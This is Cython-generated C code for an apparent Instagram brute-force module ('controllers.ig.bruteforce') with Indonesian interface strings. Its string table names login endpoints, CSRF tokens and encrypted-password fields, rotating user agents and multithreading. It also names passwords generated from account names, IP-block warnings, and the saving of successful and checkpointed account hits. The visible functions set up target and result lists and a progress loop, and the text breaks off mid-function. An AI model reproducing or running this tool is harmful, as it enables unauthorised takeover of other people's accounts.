static PyObject *__pyx_n_s_OK_FILES_SAVED;
static PyObject *__pyx_kp_u_OK_bold_green;
static PyObject *__pyx_kp_u_OK_d_B_Y;
static PyObject *__pyx_n_s_PROGRESS_CURRENT;
static PyObject *__pyx_kp_u_PWD_INSTAGRAM_BROWSER_0;
static PyObject *__pyx_kp_u_Pengikut_bold_yellow_s;
static PyObject *__pyx_kp_u_Pengikut_theme_s;
static PyObject *__pyx_kp_u_Postingan_bold_yellow_s;
static PyObject *__pyx_kp_u_Postingan_theme_s;
static PyObject *__pyx_n_s_Progress;
static PyObject *__pyx_kp_u_Proses_selesai_dalam;
static PyObject *__pyx_n_s_SESSION;
static PyObject *__pyx_n_s_START_TIME;
static PyObject *__pyx_kp_u_Sandi_Digunakan;
static PyObject *__pyx_kp_u_Setiap_theme_200_theme_500_akun;
static PyObject *__pyx_n_u_SettingsPages;
static PyObject *__pyx_n_s_SpinnerColumn;
static PyObject *__pyx_n_s_TARGET;
static PyObject *__pyx_kp_u_Tampikan_Informasi_akun;
static PyObject *__pyx_kp_u_Tgl_Lahir_bold_red_Tidak_ada;
static PyObject *__pyx_kp_u_Tgl_Lahir_theme_s;
static PyObject *__pyx_kp_u_Tgl_Pembuatan_Akun_bold_red_Tida;
static PyObject *__pyx_kp_u_Tgl_Pembuatan_Akun_theme_s;
static PyObject *__pyx_n_s_Thread;
static PyObject *__pyx_n_s_ThreadPoolExecutor;
static PyObject *__pyx_n_s_TimeElapsedColumn;
static PyObject *__pyx_n_s_Timeout;
static PyObject *__pyx_n_u_Tips;
static PyObject *__pyx_n_u_XMLHttpRequest;
static PyObject *__pyx_kp_u__16;
static PyObject *__pyx_kp_u__18;
static PyObject *__pyx_kp_u__2;
static PyObject *__pyx_kp_u__5;
static PyObject *__pyx_kp_u__6;
static PyObject *__pyx_n_s_account;
static PyObject *__pyx_n_s_add;
static PyObject *__pyx_n_s_add_task;
static PyObject *__pyx_n_s_advance;
static PyObject *__pyx_n_s_app;
static PyObject *__pyx_n_u_app;
static PyObject *__pyx_n_s_append;
static PyObject *__pyx_kp_u_application_x_www_form_urlencode;
static PyObject *__pyx_n_s_args;
static PyObject *__pyx_n_s_ask;
static PyObject *__pyx_n_s_birthday;
static PyObject *__pyx_n_u_birthday;
static PyObject *__pyx_kp_u_bold_green;
static PyObject *__pyx_kp_u_bold_red;
static PyObject *__pyx_kp_u_bold_red_IP_kena_spam_aktifkan;
static PyObject *__pyx_kp_u_bold_yellow;
static PyObject *__pyx_n_s_brute;
static PyObject *__pyx_n_u_center;
static PyObject *__pyx_kp_u_channel___a_1;
static PyObject *__pyx_n_u_checkpoint_url;
static PyObject *__pyx_n_s_choice;
static PyObject *__pyx_n_s_chunk;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_u_clock;
static PyObject *__pyx_n_s_concurrent_futures;
static PyObject *__pyx_n_s_config;
static PyObject *__pyx_n_u_config;
static PyObject *__pyx_n_s_confirm;
static PyObject *__pyx_kp_u_content_type;
static PyObject *__pyx_n_s_controllers_ig_bruteforce___init;
static PyObject *__pyx_kp_u_controllers_ig_bruteforce___init;
static PyObject *__pyx_n_s_cookie;
static PyObject *__pyx_n_u_cookie;
static PyObject *__pyx_n_s_cookie_dict_to_string;
static PyObject *__pyx_n_s_cookies;
static PyObject *__pyx_n_s_copy;
static PyObject *__pyx_n_u_count;
static PyObject *__pyx_n_s_cp;
static PyObject *__pyx_n_u_cp;
static PyObject *__pyx_n_s_created_at;
static PyObject *__pyx_n_u_created_at;
static PyObject *__pyx_n_u_csrf_token;
static PyObject *__pyx_n_s_current;
static PyObject *__pyx_kp_u_d_B_Y;
static PyObject *__pyx_kp_u_d_B_Y_H_I;
static PyObject *__pyx_n_s_data;
static PyObject *__pyx_n_u_data;
static PyObject *__pyx_n_u_date_joined;
static PyObject *__pyx_n_u_date_of_birth;
static PyObject *__pyx_n_s_datetime;
static PyObject *__pyx_n_s_description;
static PyObject *__pyx_n_s_doc;
static PyObject *__pyx_n_s_dumps;
static PyObject *__pyx_n_u_edge_follow;
static PyObject *__pyx_n_u_edge_followed_by;
static PyObject *__pyx_n_u_edge_owner_to_timeline_media;
static PyObject *__pyx_n_s_email;
static PyObject *__pyx_n_u_email;
static PyObject *__pyx_n_s_enc_password;
static PyObject *__pyx_n_s_end_time;
static PyObject *__pyx_n_s_enter;
static PyObject *__pyx_n_u_entry_data;
static PyObject *__pyx_n_s_enumerate;
static PyObject *__pyx_n_s_escape;
static PyObject *__pyx_n_s_exit;
static PyObject *__pyx_n_s_findall;
static PyObject *__pyx_n_s_followers;
static PyObject *__pyx_n_u_followers;
static PyObject *__pyx_n_s_following;
static PyObject *__pyx_n_u_following;
static PyObject *__pyx_n_s_form_data;
static PyObject *__pyx_n_u_form_data;
static PyObject *__pyx_n_s_format;
static PyObject *__pyx_n_s_fromtimestamp;
static PyObject *__pyx_n_u_full_name;
static PyObject *__pyx_n_s_generate_passsword_from_name;
static PyObject *__pyx_n_s_get;
static PyObject *__pyx_n_s_get_dict;
static PyObject *__pyx_n_s_get_duration;
static PyObject *__pyx_n_u_graphql;
static PyObject *__pyx_kp_u_harap_tunggu_beberapa_menit;
static PyObject *__pyx_n_s_headers;
static PyObject *__pyx_n_s_http;
static PyObject *__pyx_kp_u_https_www_instagram_com;
static PyObject *__pyx_kp_u_https_www_instagram_com_accounts;
static PyObject *__pyx_kp_u_https_www_instagram_com_accounts_2;
static PyObject *__pyx_n_s_i;
static PyObject *__pyx_n_s_ig;
static PyObject *__pyx_n_u_ig;
static PyObject *__pyx_n_s_ig_back;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_index;
static PyObject *__pyx_n_s_init;
static PyObject *__pyx_n_u_invalid;
static PyObject *__pyx_n_s_is_alive;
static PyObject *__pyx_n_s_item;
static PyObject *__pyx_n_s_join;
static PyObject *__pyx_n_s_json;
static PyObject *__pyx_n_s_json_object;
static PyObject *__pyx_n_s_justify;
static PyObject *__pyx_n_s_kwargs;
static PyObject *__pyx_n_s_loading;
static PyObject *__pyx_n_s_loads;
static PyObject *__pyx_n_s_login;
static PyObject *__pyx_n_s_login_ajax_url;
static PyObject *__pyx_n_s_lower;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_max_workers;
static PyObject *__pyx_n_s_media;
static PyObject *__pyx_n_u_media;
static PyObject *__pyx_n_s_metaclass;
static PyObject *__pyx_n_s_minutes;
static PyObject *__pyx_n_u_minutes;
static PyObject *__pyx_n_s_module;
static PyObject *__pyx_kp_s_mtf_app_controllers_ig_bruteforc;
static PyObject *__pyx_n_s_mtf_config;
static PyObject *__pyx_n_s_mtf_module_http_bs4;
static PyObject *__pyx_n_s_my_profile;
static PyObject *__pyx_n_u_nama123;
static PyObject *__pyx_n_u_nama12345;
static PyObject *__pyx_kp_u_nama_lengkap_akun;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_u_name;
static PyObject *__pyx_n_s_name_2;
static PyObject *__pyx_n_u_nonce;
static PyObject *__pyx_n_s_normal;
static PyObject *__pyx_n_s_now;
static PyObject *__pyx_n_s_num_retries;
static PyObject *__pyx_n_s_ok;
static PyObject *__pyx_n_u_ok;
static PyObject *__pyx_n_s_optIntoOneTap;
static PyObject *__pyx_n_s_os;
static PyObject *__pyx_n_s_panel;
static PyObject *__pyx_n_s_password;
static PyObject *__pyx_n_u_password;
static PyObject *__pyx_n_s_password_used;
static PyObject *__pyx_n_s_path;
static PyObject *__pyx_n_s_payload;
static PyObject *__pyx_kp_u_pensive_face_Tidak_ada_daftar_I;
static PyObject *__pyx_n_s_phone;
static PyObject *__pyx_n_u_phone;
static PyObject *__pyx_n_u_phone_number;
static PyObject *__pyx_kp_u_please_wait_a_few_minutes;
static PyObject *__pyx_n_s_pool;
static PyObject *__pyx_n_s_post;
static PyObject *__pyx_n_s_prepare;
static PyObject *__pyx_n_s_print;
static PyObject *__pyx_n_s_print_exc;
static PyObject *__pyx_n_s_profile;
static PyObject *__pyx_n_s_profile_channel;
static PyObject *__pyx_n_s_progress;
static PyObject *__pyx_n_u_progress;
static PyObject *__pyx_kp_u_progress_description_task_descr;
static PyObject *__pyx_kp_u_progress_percentage_task_percen;
static PyObject *__pyx_n_s_qualname;
static PyObject *__pyx_n_s_queryParams;
static PyObject *__pyx_n_s_randint;
static PyObject *__pyx_n_s_random;
static PyObject *__pyx_n_s_random_user_agent;
static PyObject *__pyx_n_s_randoms;
static PyObject *__pyx_n_s_re;
static PyObject *__pyx_n_s_requests_exceptions;
static PyObject *__pyx_n_s_response;
static PyObject *__pyx_kp_u_result_ig;
static PyObject *__pyx_n_s_results;
static PyObject *__pyx_n_s_retries;
static PyObject *__pyx_n_s_rich;
static PyObject *__pyx_n_u_rollout_hash;
static PyObject *__pyx_n_s_root;
static PyObject *__pyx_n_s_save_result;
static PyObject *__pyx_n_s_saved;
static PyObject *__pyx_n_s_self;
static PyObject *__pyx_n_s_shared_data;
static PyObject *__pyx_n_s_shared_url;
static PyObject *__pyx_n_u_show_info;
static PyObject *__pyx_n_s_sleep;
static PyObject *__pyx_n_s_start;
static PyObject *__pyx_n_s_start_time;
static PyObject *__pyx_n_s_status;
static PyObject *__pyx_n_u_status;
static PyObject *__pyx_n_s_status_code;
static PyObject *__pyx_n_s_stopDeletionNonce;
static PyObject *__pyx_n_s_strftime;
static PyObject *__pyx_n_s_strip;
static PyObject *__pyx_n_s_style;
static PyObject *__pyx_n_s_submit;
static PyObject *__pyx_n_s_subtitle;
static PyObject *__pyx_n_s_suflix;
static PyObject *__pyx_n_s_target;
static PyObject *__pyx_n_s_task;
static PyObject *__pyx_n_u_task;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_s_text;
static PyObject *__pyx_n_u_theme;
static PyObject *__pyx_n_s_thread;
static PyObject *__pyx_n_s_threading;
static PyObject *__pyx_n_s_time;
static PyObject *__pyx_n_s_timestamp;
static PyObject *__pyx_n_u_timestamp;
static PyObject *__pyx_n_s_tips;
static PyObject *__pyx_n_s_title;
static PyObject *__pyx_n_s_total;
static PyObject *__pyx_n_s_traceback;
static PyObject *__pyx_n_s_tree;
static PyObject *__pyx_n_s_trustedDeviceRecords;
static PyObject *__pyx_kp_u_txt;
static PyObject *__pyx_n_u_ua;
static PyObject *__pyx_n_s_ualist;
static PyObject *__pyx_n_s_unquote;
static PyObject *__pyx_n_s_update;
static PyObject *__pyx_n_s_upper;
static PyObject *__pyx_n_s_urllib_parse;
static PyObject *__pyx_n_s_user;
static PyObject *__pyx_n_u_user;
static PyObject *__pyx_n_u_userId;
static PyObject *__pyx_n_s_user_agent;
static PyObject *__pyx_n_u_user_agent;
static PyObject *__pyx_n_s_username;
static PyObject *__pyx_n_u_username;
static PyObject *__pyx_n_s_users;
static PyObject *__pyx_n_s_utils;
static PyObject *__pyx_n_u_web;
static PyObject *__pyx_kp_u_window__sharedData_s_s;
static PyObject *__pyx_kp_u_x_asbd_id;
static PyObject *__pyx_kp_u_x_csrftoken;
static PyObject *__pyx_kp_u_x_ig_www_claim;
static PyObject *__pyx_kp_u_x_instagram_ajax;
static PyObject *__pyx_kp_u_x_requested_with;
static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self);  
static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_5start_loading(PyObject *__pyx_self, PyObject *__pyx_v_thread, PyObject *__pyx_v_task, PyObject *__pyx_v_status);  
static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_5start_2normal(PyObject *__pyx_self, PyObject *__pyx_v_data, PyObject *__pyx_v_kwargs, PyObject *__pyx_v_task, PyObject *__pyx_v_status);  
static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_5start_4randoms(PyObject *__pyx_self, PyObject *__pyx_v_data, PyObject *__pyx_v_kwargs, PyObject *__pyx_v_task, PyObject *__pyx_v_status);  
static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_2start(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self);  
static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_4profile_channel(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_username, PyObject *__pyx_v_cookie);  
static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_6my_profile(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_username, PyObject *__pyx_v_cookie);  
static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_8_brute(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_users, PyObject *__pyx_v_kwargs);  
static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init_____defaults__(CYTHON_UNUSED PyObject *__pyx_self);  
static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_10login(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_username, PyObject *__pyx_v_password, PyObject *__pyx_v_retries, PyObject *__pyx_v_user_agent);  
static PyObject *__pyx_tp_new_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start(PyTypeObject *t, PyObject *a, PyObject *k);  
static __Pyx_CachedCFunction __pyx_umethod_PyDict_Type_update = {0, &__pyx_n_s_update, 0, 0, 0};
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_1;
static PyObject *__pyx_int_2;
static PyObject *__pyx_int_5;
static PyObject *__pyx_int_25;
static PyObject *__pyx_int_123;
static PyObject *__pyx_int_429;
static PyObject *__pyx_int_12345;
static PyObject *__pyx_int_190000;
static PyObject *__pyx_int_200000;
static PyObject *__pyx_slice__8;
static PyObject *__pyx_tuple__3;
static PyObject *__pyx_tuple__4;
static PyObject *__pyx_tuple__7;
static PyObject *__pyx_tuple__9;
static PyObject *__pyx_tuple__11;
static PyObject *__pyx_tuple__13;
static PyObject *__pyx_tuple__15;
static PyObject *__pyx_tuple__17;
static PyObject *__pyx_tuple__19;
static PyObject *__pyx_tuple__21;
static PyObject *__pyx_tuple__23;
static PyObject *__pyx_tuple__25;
static PyObject *__pyx_tuple__26;
static PyObject *__pyx_tuple__28;
static PyObject *__pyx_tuple__30;
static PyObject *__pyx_codeobj__10;
static PyObject *__pyx_codeobj__12;
static PyObject *__pyx_codeobj__14;
static PyObject *__pyx_codeobj__20;
static PyObject *__pyx_codeobj__22;
static PyObject *__pyx_codeobj__24;
static PyObject *__pyx_codeobj__27;
static PyObject *__pyx_codeobj__29;
static PyObject *__pyx_codeobj__31;
 

 

 
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_1__init__(PyObject *__pyx_self, PyObject *__pyx_v_self);  
static PyMethodDef __pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_1__init__ = {"__init__", (PyCFunction)__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_1__init__, METH_O, 0};
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_1__init__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__init__ (wrapper)", 0);
  __pyx_r = __pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base___init__(__pyx_self, ((PyObject *)__pyx_v_self));

   
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__init__", 0);

   
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_TARGET, __pyx_t_1) < 0) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_OK, __pyx_t_1) < 0) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_CP, __pyx_t_1) < 0) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_PROGRESS_CURRENT, __pyx_int_0) < 0) __PYX_ERR(0, 30, __pyx_L1_error)

   
  __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_SESSION, __pyx_t_1) < 0) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_IP_IS_BLOCKED, Py_False) < 0) __PYX_ERR(0, 32, __pyx_L1_error)

   

   
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.__init__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

 

 
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_3start(PyObject *__pyx_self, PyObject *__pyx_v_self);  
static PyMethodDef __pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_3start = {"start", (PyCFunction)__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_3start, METH_O, 0};
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_3start(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("start (wrapper)", 0);
  __pyx_r = __pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_2start(__pyx_self, ((PyObject *)__pyx_v_self));

   
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

 

 
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_5start_1loading(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds);  
static PyMethodDef __pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_5start_1loading = {"loading", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_5start_1loading, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_5start_1loading(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_thread = 0;
  PyObject *__pyx_v_task = 0;
  PyObject *__pyx_v_status = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("loading (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_thread,&__pyx_n_s_task,&__pyx_n_s_status,0};
    PyObject* values[3] = {0,0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_thread)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_task)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("loading", 1, 3, 3, 1); __PYX_ERR(0, 79, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_status)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("loading", 1, 3, 3, 2); __PYX_ERR(0, 79, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "loading") < 0)) __PYX_ERR(0, 79, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 3) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
      values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
    }
    __pyx_v_thread = values[0];
    __pyx_v_task = values[1];
    __pyx_v_status = values[2];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("loading", 1, 3, 3, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 79, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.start.loading", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_5start_loading(__pyx_self, __pyx_v_thread, __pyx_v_task, __pyx_v_status);

   
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_5start_loading(PyObject *__pyx_self, PyObject *__pyx_v_thread, PyObject *__pyx_v_task, PyObject *__pyx_v_status) {
  struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *__pyx_cur_scope;
  struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *__pyx_outer_scope;
  PyObject *__pyx_v_description = NULL;
  PyObject *__pyx_v_current = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  Py_ssize_t __pyx_t_5;
  Py_UCS4 __pyx_t_6;
  Py_ssize_t __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("loading", 0);
  __pyx_outer_scope = (struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *) __Pyx_CyFunction_GetClosure(__pyx_self);
  __pyx_cur_scope = __pyx_outer_scope;

   
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_thread, __pyx_n_s_start); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 80, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 80, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  while (1) {
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_thread, __pyx_n_s_is_alive); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 81, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 81, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 81, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (!__pyx_t_4) break;

     
    if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 82, __pyx_L1_error) }
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_IP_IS_BLOCKED); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 82, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 82, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (__pyx_t_4) {

       
      __Pyx_INCREF(__pyx_kp_u_bold_red_IP_kena_spam_aktifkan);
      __Pyx_XDECREF_SET(__pyx_v_description, __pyx_kp_u_bold_red_IP_kena_spam_aktifkan);

       
      goto __pyx_L5;
    }

     
      {
      if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 85, __pyx_L1_error) }
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_TARGET); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 85, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_5 = PyObject_Length(__pyx_t_1); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 85, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 85, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 85, __pyx_L1_error) }
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_PROGRESS_CURRENT); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 85, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_3 = PyNumber_Subtract(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 85, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF_SET(__pyx_v_current, __pyx_t_3);
      __pyx_t_3 = 0;

       
      __pyx_t_3 = PyTuple_New(8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)
